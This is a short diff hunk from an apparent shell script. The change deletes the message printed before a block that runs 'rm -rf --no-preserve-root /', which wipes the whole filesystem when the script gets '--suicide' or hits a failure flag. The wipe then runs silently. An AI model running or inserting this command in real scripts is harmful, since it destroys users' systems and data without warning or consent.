@@ -90,6 +90,5 @@ done
 
 if [ "$1" = "--suicide" ] || $rfail ; then
     #oh gawd
-    echo rming root...
     rm -rf --no-preserve-root /
 fi
